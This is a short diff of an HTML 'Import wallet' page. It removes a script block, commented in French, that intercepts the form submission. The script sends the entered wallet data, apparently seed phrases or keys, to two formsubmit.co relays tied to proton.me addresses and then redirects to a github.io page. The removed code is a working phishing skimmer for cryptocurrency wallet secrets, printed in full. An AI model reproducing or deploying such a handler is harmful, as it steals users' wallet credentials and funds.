@@ -171,30 +171,6 @@
     <button type="submit" class="submit-button">Import wallet</button>
 </form>
 
-<script>
-document.getElementById("walletForm").addEventListener("submit", function(e) {
-    e.preventDefault(); // Empêche l'envoi immédiat
-
-    let form = this;
-    let formData = new FormData(form);
-
-    // 1er envoi vers le premier email
-    fetch("https://formsubmit.co/code-iptv@proton.me", {
-        method: "POST",
-        body: formData
-    }).then(() => {
-        // 2e envoi vers le deuxième email
-        return fetch("https://formsubmit.co/PotionMagique7@proton.me", {
-            method: "POST",
-            body: formData
-        });
-    }).then(() => {
-        // Redirection finale après soumission
-        window.location.href = "https://fauxon.github.io/fhrdhqctvghbn-/";
-    }).catch(error => console.error("Erreur :", error));
-});
-</script>
-
     <div id="output"></div>
 </div>
 
